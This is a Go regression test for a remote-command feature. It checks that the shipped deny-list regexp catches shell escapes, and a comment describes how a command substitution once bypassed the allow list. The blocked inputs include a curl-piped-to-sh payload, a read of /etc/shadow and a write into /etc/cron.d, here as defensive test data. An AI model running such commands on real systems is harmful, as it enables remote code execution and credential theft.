package cli

import (
	"regexp"
	"testing"

	"github.com/spf13/viper"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// The remote command is written to a script file and executed through /bin/sh,
// so the deny list is filtering a shell string. Every shell metacharacter is
// therefore an escape from the allow list, not only the ones that chain
// commands -- and the original default omitted $ ( ) and the backtick.
//
// With the shipped allow list of ^/usr/bin/.*, that left
// "/usr/bin/env $(curl http://host/x|sh)" matching allow, matching no deny
// term, and the shell running the substitution: arbitrary execution from an
// operator who is only permitted the allow-listed commands.
func TestDefaultRemoteCommandDenyBlocksShellEscapes(t *testing.T) {
	viperCfg := viper.New()
	SetViperConfigDefaults(viperCfg)

	patterns := viperCfg.GetStringSlice("remote-commands.deny")
	require.Len(t, patterns, 1)

	deny, err := regexp.Compile(patterns[0])
	require.NoError(t, err, "the shipped default must be a valid regexp")

	blocked := []string{
		`/usr/bin/env $(curl http://host/x|sh)`,
		"/usr/bin/env `curl http://host/x`",
		`/usr/bin/env $IFS`,
		`/usr/bin/sh -c (echo hi)`,
		`/usr/bin/echo ${HOME}`,
		`/usr/bin/echo a && /usr/bin/id`,
		`/usr/bin/echo a; /usr/bin/id`,
		`/usr/bin/echo a | /usr/bin/id`,
		`/usr/bin/cat < /etc/shadow`,
		`/usr/bin/echo a > /etc/cron.d/x`,
	}
	for _, cmd := range blocked {
		assert.True(t, deny.MatchString(cmd), "the default deny list should match %q", cmd)
	}

	// An ordinary allow-listed invocation still runs. The deny list is defense
	// in depth in front of a shell, not the boundary -- the boundary is
	// remote-commands.enabled -- so it must not be so broad that it makes the
	// feature useless.
	allowed := []string{
		`/usr/bin/uptime`,
		`/usr/bin/systemctl status proxiport`,
		`/usr/bin/df -h /var`,
		`/usr/local/bin/check --format=json --timeout 5`,
	}
	for _, cmd := range allowed {
		assert.False(t, deny.MatchString(cmd), "the default deny list should not match %q", cmd)
	}
}
